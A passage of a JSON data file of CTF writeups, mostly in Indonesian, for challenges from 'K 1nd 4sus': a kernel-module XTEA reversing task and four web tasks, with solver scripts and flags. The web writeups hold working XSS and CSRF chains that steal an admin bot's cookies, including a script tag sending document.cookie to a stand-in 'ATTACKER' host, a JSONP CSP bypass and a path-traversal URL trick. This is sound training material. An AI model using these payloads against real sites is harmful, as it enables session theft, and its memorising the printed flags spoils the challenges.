safe=\"(){}=>'/.:,;+*[]\"\r\n    )\r\n\r\n    add = s.post(\r\n        f\"{BASE_URL}/add_song\",\r\n        data={\"title\": \"pwnsong\", \"spotify_url\": payload},\r\n        allow_redirects=True,\r\n        timeout=10,\r\n    )\r\n    if add.status_code != 200:\r\n        raise RuntimeError(\"Failed to store payload song\")\r\n\r\n    dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n    song_ids = extract_song_ids(dashboard.text)\r\n    if not song_ids:\r\n        raise RuntimeError(\"No song found in dashboard\")\r\n\r\n    target_song_id = song_ids[-1]\r\n\r\n    report = s.post(f\"{BASE_URL}/report\", data={\"song_id\": target_song_id}, timeout=10)\r\n    if report.status_code != 200:\r\n        raise RuntimeError(\"Report failed\")\r\n\r\n    flag = None\r\n    for _ in range(20):\r\n        time.sleep(3)\r\n        dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n        titles = extract_titles(dashboard.text)\r\n        for t in titles:\r\n            m = re.search(r\"KSUS\\{[^}]+\\}\", t)\r\n            if m:\r\n                flag = m.group(0)\r\n                break\r\n        if flag:\r\n            break\r\n\r\n    if not flag:\r\n        raise RuntimeError(\"Flag not found. Try running again.\")\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{4b4eba6646f7903fd437d6fbf1b5783d}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-rev-ring0security-image",
    "title": "- Ring 0 Security (?)",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "K 1nd 4sus",
    "tags": [],
    "description": "Writeup for challenge - Ring 0 Security (?)",
    "problemDescription": "Challenge ini ngasih modul kernel Linux (`decoder.ko`) dan petunjuk kalau ada PIN 4 digit.\nTargetnya adalah dapetin flag dari mekanisme dekripsi di driver.\n\nHasil akhir:\n- PIN: `5102`\n- Flag: `KSUS{dr1v3r_cr4ck1ng_101}`",
    "tools": [],
    "analysis": "File yang tersedia:\n- `bzImage`\n- `initramfs.cpio.gz`\n- `qemu_run.sh`\n\n`qemu_run.sh` cuma boot kernel + initramfs ke shell minimal.\nSetelah ekstrak initramfs, file yang relevan hanya:\n- `init`\n- `challenge/decoder.ko`\n\nArtinya semua logika challenge memang ada di modul kernel itu.",
    "solution": [
      {
        "title": "Reversing `decoder.ko`",
        "content": "Dari simbol yang masih ada, fungsi penting:\n- `ctls` (handler ioctl)\n- `xtea_decrypt`\n- data global: `session_key`, `enc_flag`, `res`, `status`"
      },
      {
        "title": "Alur ioctl",
        "content": "Ada dua command utama di `ctls`:\n\n1. `0x401b3700`\n- Ambil 4 byte dari user (`copy_from_user`).\n- Masuk ke jalur `ctls.cold`.\n- Di jalur ini:\n  - `session_key[1] = 0xCAFEBABE`\n  - `session_key[0] = input | 0x13370000`\n  - `session_key[2..3] = 0xDEADBEEF, 0xFEEDFACE`\n\n2. `0x801b3701`\n- Copy `enc_flag` ke buffer `res`.\n- Dekripsi 4 blok (32 byte total) pakai XTEA decrypt 32 round.\n- `copy_to_user` hasil plaintext."
      },
      {
        "title": "Bentuk key final",
        "content": "Dari analisis relocation + disassembly, key yang dipakai decrypt adalah:\n\n- `k0 = 0x13370000 | pin`\n- `k1 = 0xCAFEBABE`\n- `k2 = 0xDEADBEEF`\n- `k3 = 0xFEEDFACE`\n\nIni bagian krusial. Waktu asumsi posisi key salah, plaintext jadi acak semua."
      },
      {
        "title": "Solver",
        "content": "Solver final disimpan di `solve.py`.\n\nCara jalanin:\n\n\n\nOutput yang diharapkan:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport struct\r\n\r\ndef xtea_decrypt_block(v0: int, v1: int, key_words):\r\n    sum_ = 0xC6EF3720\r\n    for _ in range(32):\r\n        v1 = (v1 - ((((v0 << 4) & 0xFFFFFFFF) ^ (v0 >> 5)) + v0 ^ ((sum_ + key_words[(sum_ >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n        sum_ = (sum_ - 0x9E3779B9) & 0xFFFFFFFF\r\n        v0 = (v0 - ((((v1 << 4) & 0xFFFFFFFF) ^ (v1 >> 5)) + v1 ^ ((sum_ + key_words[sum_ & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF\r\n    return v0, v1\r\n\r\n\r\ndef decrypt_flag(enc_flag: bytes, key_words):\r\n    out = bytearray()\r\n    for i in range(0, len(enc_flag), 8):\r\n        v0, v1 = struct.unpack('<2I', enc_flag[i:i + 8])\r\n        d0, d1 = xtea_decrypt_block(v0, v1, key_words)\r\n        out.extend(struct.pack('<2I', d0, d1))\r\n    return bytes(out)\r\n\r\n\r\ndef main():\r\n    # Ciphertext flag (enc_flag) dari decoder.ko hasil reversing section .data.\r\n    enc_flag = bytes.fromhex(\r\n        '7e38614d358f6d302e25c10149953ef9'\r\n        'b09cf265ff9459ec57fcb593b833c7b6'\r\n    )\r\n\r\n    for pin in range(10000):\r\n        key = [\r\n            0x13370000 | pin,  # session_key[0] <- pin via ioctl 0x401b3700\r\n            0xCAFEBABE,         # session_key[1] set di ctls.cold\r\n            0xDEADBEEF,         # session_key[2]\r\n            0xFEEDFACE,         # session_key[3]\r\n        ]\r\n\r\n        pt = decrypt_flag(enc_flag, key)\r\n        if b'KSUS{' in pt and b'}' in pt:\r\n            flag = pt.split(b'\\x00', 1)[0].decode('ascii', errors='ignore')\r\n            print(f'[+] PIN  : {pin:04d}')\r\n            print(f'[+] FLAG : {flag}')\r\n            return\r\n\r\n    print('[-] Flag tidak ditemukan')\r\n\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{dr1v3r_cr4ck1ng_101}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-web-spotivibe1-spotivibe1",
    "title": "SpotiVibe 1 (Web Misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-08",
    "author": "Nattt",
    "ctfName": "K 1nd 4sus",
    "tags": [],
    "description": "Writeup for challenge SpotiVibe 1 (Web Misc)",
    "problemDescription": "The app has an admin review bot that visits reported songs and sets a `flag` cookie before opening the song page.\n\nThe bug is in Spotify URL validation:\n- It checks `hostname == open.spotify.com`\n- It checks `path.startswith(\"/embed/\")`\n- It does **not** check URL scheme (`http/https` only)\n\nBecause of this, a `javascript:` URL can pass validation if crafted as:\n- `javascript://open.spotify.com/embed/...`\n\nThen the song page places it directly into:\n```html\n<iframe src=\"{{ song.spotify_url }}\">\n```\n\nSo when admin bot loads the page, JavaScript executes and can read `document.cookie`, including:\n- `flag=KSUS{...}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge Info",
        "content": "- Category: Web Misc\n- Title: SpotiVibe 1\n- Target: `http://chall.k1nd4sus.it:30502`"
      },
      {
        "title": "Root Cause",
        "content": "In `is_valid_spotify_url(url)`:\n- `parsed.hostname` is trusted\n- `parsed.path` is trusted\n- no scheme allowlist is enforced\n\nThis allows script URLs disguised with a fake authority/path structure."
      },
      {
        "title": "Exploit Strategy",
        "content": "Direct exfiltration to external webhook is not necessary.\n\nInstead, payload does this inside bot browser:\n1. `fetch('/logout')`\n2. Login as attacker account\n3. `POST /add_song` with:\n   - `title = document.cookie`\n   - valid spotify URL in `spotify_url`\n\nNow the stolen cookie string (containing `flag=...`) is stored as a song title in our own account.\n\nAfter reporting the malicious song, bot visits it and runs payload.  \nWe then poll `/dashboard` and read the new song title to extract the flag."
      },
      {
        "title": "Solver",
        "content": "File: `solver.py`"
      },
      {
        "title": "Run",
        "content": "Expected output:",
        "code": "source /home/nata/ctf_env/bin/activate\npython3 solver.py"
      },
      {
        "title": "Notes",
        "content": "- The exploit is reliable because bot explicitly sets cookie:\n  - name: `flag`\n  - path: `/`\n  - `httpOnly: False`\n- If network timing is slow, run solver again (it already includes polling/retry logic)."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solver.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport time\r\nimport urllib.parse\r\n\r\nimport requests\r\n\r\n\r\nBASE_URL = \"http://chall.k1nd4sus.it:30502\"\r\n\r\n\r\ndef extract_song_ids(html: str):\r\n    return re.findall(r\"/song/(\\d+)\", html)\r\n\r\n\r\ndef extract_titles(html: str):\r\n    return re.findall(r'<a href=\"/song/\\d+\">\\s*([^<]+?)\\s*</a>', html)\r\n\r\n\r\ndef main():\r\n    s = requests.Session()\r\n\r\n    username = f\"atk_{int(time.time())}\"\r\n    password = username\r\n\r\n    s.post(\r\n        f\"{BASE_URL}/register\",\r\n        data={\"username\": username, \"password\": password},\r\n        timeout=10,\r\n    )\r\n\r\n    login = s.post(\r\n        f\"{BASE_URL}/login\",\r\n        data={\"username\": username, \"password\": password},\r\n        allow_redirects=False,\r\n        timeout=10,\r\n    )\r\n    if login.status_code != 302:\r\n        raise RuntimeError(\"Login failed\")\r\n\r\n    js = (\r\n        \"(async()=>{\"\r\n        \"await fetch('/logout');\"\r\n        f\"await fetch('/login',{{method:'POST',body:new URLSearchParams({{username:'{username}',password:'{password}'}})}});\"\r\n        \"await fetch('/add_song',{method:'POST',body:new URLSearchParams({title:document.cookie,spotify_url:'//open.spotify.com/embed/track/1'})});\"\r\n        \"})()\"\r\n    )\r\n    payload = \"javascript://open.spotify.com/embed/%0a\" + urllib.parse.quote(\r\n        js, safe=\"(){}=>'/.:,;+*[]\"\r\n    )\r\n\r\n    add = s.post(\r\n        f\"{BASE_URL}/add_song\",\r\n        data={\"title\": \"pwnsong\", \"spotify_url\": payload},\r\n        allow_redirects=True,\r\n        timeout=10,\r\n    )\r\n    if add.status_code != 200:\r\n        raise RuntimeError(\"Failed to store payload song\")\r\n\r\n    dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n    song_ids = extract_song_ids(dashboard.text)\r\n    if not song_ids:\r\n        raise RuntimeError(\"No song found in dashboard\")\r\n\r\n    target_song_id = song_ids[-1]\r\n\r\n    report = s.post(f\"{BASE_URL}/report\", data={\"song_id\": target_song_id}, timeout=10)\r\n    if report.status_code != 200:\r\n        raise RuntimeError(\"Report failed\")\r\n\r\n    flag = None\r\n    for _ in range(20):\r\n        time.sleep(3)\r\n        dashboard = s.get(f\"{BASE_URL}/dashboard\", timeout=10)\r\n        titles = extract_titles(dashboard.text)\r\n        for t in titles:\r\n            m = re.search(r\"KSUS\\{[^}]+\\}\", t)\r\n            if m:\r\n                flag = m.group(0)\r\n                break\r\n        if flag:\r\n            break\r\n\r\n    if not flag:\r\n        raise RuntimeError(\"Flag not found. Try running again.\")\r\n\r\n    print(f\"<FLAG>{flag}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{4b4eba6646f7903fd437d6fbf1b5783d}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-web-ezbounty",
    "title": "Writeup - Ez Bounty",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "K 1nd 4sus",
    "tags": [],
    "description": "Challenge: **Ez Bounty**  \nKategori: **Web**",
    "problemDescription": "Aplikasi punya dua isu yang bisa dirangkai:\n\n1. **CSRF di `/logout` dan `/login`**\n- Tidak ada token CSRF.\n- Cookie session diset dengan `SameSite=None`, jadi request cross-site tetap membawa cookie.\n- `/logout` pakai GET, jadi bisa dipicu lewat `<img src=...>`.\n\n2. **Stored XSS di dashboard**\n- Username dirender dengan `{{ username | safe }}` di `templates/dashboard.html`.\n- Artinya HTML/JS dari username dieksekusi saat halaman dashboard dibuka.",
    "tools": [],
    "analysis": "Di `app.py`:\n- Bot login sebagai admin.\n- Setelah login, bot set cookie `flag` (`httpOnly=False`, `sameSite=None`, `secure=True`).\n- Lalu bot membuka URL yang kita submit ke `/report`.\n\nKarena cookie `flag` tidak HttpOnly, JavaScript bisa baca `document.cookie`.",
    "solution": [
      {
        "title": "Rantai Eksploitasi",
        "content": "1. Buat akun dengan username berisi XSS:\n```html\n<script>new Image().src='https://ATTACKER/x?c='+encodeURIComponent(document.cookie)</script>\n```\n\n2. Host halaman `exploit.html` di domain publik attacker. Isinya:\n- Trigger `GET /logout` (biar admin logout).\n- Auto-submit form POST ke `/login` dengan credential akun XSS tadi.\n\n3. Submit URL `exploit.html` ke `/report`.\n\n4. Bot admin membuka halaman attacker:\n- session admin logout,\n- login sebagai akun XSS,\n- redirect ke `/dashboard`,\n- XSS jalan dan kirim `document.cookie` ke endpoint attacker.\n\n5. Dari callback, ambil nilai cookie `flag`."
      },
      {
        "title": "Solver",
        "content": "File solver: `solver.py`\n\nScript ini mengotomasi:\n- pendaftaran user payload XSS,\n- pendaftaran user pelapor,\n- submit report,\n- serve `/exploit.html` dan endpoint `/x` lokal,\n- parsing flag dari callback.\n\n### Cara pakai\n1. Aktifkan venv:\n```bash\nsource /home/nata/ctf_env/bin/activate\n```\n\n2. Jalankan tunnel ke port lokal 8000 (contoh ngrok):\n```bash\nngrok http 8000\n```\n\n3. Ambil URL publik ngrok, lalu jalankan solver:\n```bash\npython3 solver.py --public-url https://YOUR-NGROK-DOMAIN\n```\n\n4. Jika berhasil, output berisi:\n```text\n<FLAG>...</FLAG>\n```"
      },
      {
        "title": "Catatan Teknis",
        "content": "- Challenge minta Chromium-based karena bot memakai Chrome headless (`pyppeteer` + `google-chrome-stable`).\n- Beberapa skema URL seperti `javascript:`/`data:` tidak selalu reliable di konteks ini, jadi chain paling stabil adalah halaman attacker publik + CSRF login + stored XSS."
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{moneyless_iframe_baby}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-web-layeredcakeshop",
    "title": "Layered Cake Shop Writeup",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "K 1nd 4sus",
    "tags": [],
    "description": "Writeup for challenge Layered Cake Shop Writeup",
    "problemDescription": "- `GET /api/orders/<orderId>` bisa diakses tanpa auth dan membocorkan field `debug` untuk order gagal.\n- Field `debug.buildLog` membocorkan build image ID internal: `cake-2026-04-3e57c0`.\n- `GET /api/cakes/<name>/preview` pada value tertentu memicu error 500 yang mengungkap header internal:\n  - `X-Service: image-builder`\n  - `X-Upstream-Url: https://supersecureregistry.k1nd4sus.it/v2/`\n- Docker Registry internal bisa diakses publik (`/v2/_catalog`, `/tags/list`, `/manifests`, `/blobs`).\n- Layer image menyimpan file sensitif (`/app/secret_recipe.txt`) di layer tengah walaupun dihapus di layer akhir (masih bisa diekstrak dari blob layer).",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Challenge",
        "content": "- Name: `Layered Cake Shop`\n- Prompt: *I would really love to make Cannavaiolo's cake at home! Could you find the secret ingredients for me?*\n- Target: `http://chall.k1nd4sus.it:30509`"
      },
      {
        "title": "Langkah Eksploit (Manual)",
        "content": "1. Ambil order gagal awal:\n```bash\ncurl -s http://chall.k1nd4sus.it:30509/api/orders/ORD-2026-04-0001 | jq .\n```\nOutput penting:\n- `customer: \"cannavaiolo\"`\n- `debug.buildLog: \"failed to build image cake-2026-04-3e57c0 ...\"`\n\n2. Trigger preview pakai `build id` untuk leak upstream:\n```bash\ncurl -i -s http://chall.k1nd4sus.it:30509/api/cakes/cake-2026-04-3e57c0/preview\n```\nHeader penting:\n- `X-Upstream-Url: https://supersecureregistry.k1nd4sus.it/v2/`\n\n3. Enumerasi registry:\n```bash\ncurl -s https://supersecureregistry.k1nd4sus.it/v2/_catalog | jq .\ncurl -s https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/tags/list | jq .\n```\nTag penting:\n- `cake-2026-04-3e57c0-prod`\n\n4. Ambil manifest OCI:\n```bash\ncurl -s \\\n  -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.v2+json' \\\n  https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/manifests/cake-2026-04-3e57c0-prod | jq .\n```\n\n5. Download layer blob lalu cari flag/secret:\n```bash\ncurl -s https://supersecureregistry.k1nd4sus.it/v2/cakes/cannavaiolo/blobs/<layer-digest> -o layer.gz\ngzip -dc layer.gz | strings | grep -E 'KSUS\\{.*\\}'\n```"
      },
      {
        "title": "Solver Otomatis",
        "content": "Gunakan script:\n```bash\npython3 solver.py\n```\nScript melakukan:\n- Pivot dari order gagal\n- Leak upstream registry dari header preview error\n- Resolve repo+tag berdasarkan customer + build id\n- Pull manifest OCI dan semua layer\n- Regex `KSUS{...}` dari blob layer"
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{Th1s_C4k3_T4sT3s_L1k3_a_Sl4P}",
    "lessonsLearned": ""
  },
  {
    "id": "k1nd4sus-web-sportivibe2",
    "title": "SpotiVibe 2 - Writeup (Web Misc)",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-08-16",
    "author": "Nattt",
    "ctfName": "K 1nd 4sus",
    "tags": [],
    "description": "Writeup for challenge SpotiVibe 2 - Writeup (Web Misc)",
    "problemDescription": "Challenge ini kelihatan seperti patch dari SpotiVibe 1, tapi masih bisa di-chain lewat 3 bug:\n\n1. **XSS di dashboard**\n   - Di `dashboard.html` ada `{{ search | safe }}`.\n   - Artinya input `search` dirender tanpa escaping.\n\n2. **CSP bypass lewat whitelisted domain**\n   - CSP dashboard hanya mengizinkan script dari `self` + `https://www.w3schools.com` + nonce.\n   - Tapi ada endpoint JSONP yang masih aktif:\n     - `https://www.w3schools.com/js/demo_jsonp2.php?callback=...`\n   - Ini memungkinkan eksekusi JS attacker tanpa nonce.\n\n3. **URL parser mismatch di validasi spotify_url**\n   - Server validasi `spotify_url` dengan:\n     - `decoded = unquote(url)`\n     - `urlparse(decoded)`\n     - host harus `open.spotify.com`\n     - path harus `/embed/...`\n   - Payload pakai `%68%74%74%70://...` (`http://` dalam bentuk encoded).\n   - Server melakukan `unquote` dulu, jadi menganggap ini URL valid ke Spotify.\n   - Browser **tidak** decode bagian encoded itu sebagai scheme saat set `iframe src`, jadi dianggap path relatif di origin challenge.",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Informasi Challenge",
        "content": "- Nama: SpotiVibe 2\n- Kategori: Web Misc\n- Target: `http://chall.k1nd4sus.it:30503`"
      },
      {
        "title": "Intuisi Exploit",
        "content": "Tujuan kita: memaksa bot admin (yang visit `/song/<id>`) agar iframe malah membuka:\n\n`/dashboard?search=<xss_payload>`\n\nBiar XSS jalan di konteks admin, baca `document.cookie` (yang berisi `flag=KSUS{...}`), lalu simpan hasil ke akun attacker sendiri via `POST /add_song`.\n\nTrik URL yang dipakai:\n\n`%68%74%74%70://open.spotify.com/embed/../../../../../dashboard?search=<payload>`\n\nKenapa `../../../../../`?\n- Karena iframe dimuat dari halaman `/song/<id>`.\n- Dengan traversal yang cukup, path akhirnya normalisasi ke `/dashboard`."
      },
      {
        "title": "Langkah Exploit",
        "content": "1. Register + login akun attacker.\n2. Tambah lagu berisi `spotify_url` payload di atas.\n3. `search` diisi `<script src='https://www.w3schools.com/js/demo_jsonp2.php?callback=...'></script>`.\n4. Report song id ke bot admin.\n5. Saat bot buka `/song/<id>`:\n   - iframe resolve ke `/dashboard?search=...`\n   - XSS jalan (via JSONP W3Schools)\n   - JS payload melakukan:\n     - `fetch('/logout')`\n     - login ulang sebagai attacker\n     - `POST /add_song` dengan `title=document.cookie`\n6. Poll `/dashboard` attacker sampai `KSUS{...}` muncul di judul lagu."
      },
      {
        "title": "Solver",
        "content": "File: `solver.py`\n\nJalankan:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solver.py\n```\n\nOutput sukses:\n\n```text\n<FLAG>KSUS{...}</FLAG>\n```"
      },
      {
        "title": "Catatan Praktis",
        "content": "- Kadang bot antre, jadi kalau belum dapat di percobaan pertama, jalankan lagi.\n- Solver yang dipakai di sini adalah versi direct final chain (tanpa brute-force kandidat URL banyak)."
      }
    ],
    "terminalOutputs": [],
    "flag": "KSUS{61592b2c5b7175ebe1da5f799285a3b3}",
    "lessonsLearned": ""
  }
];
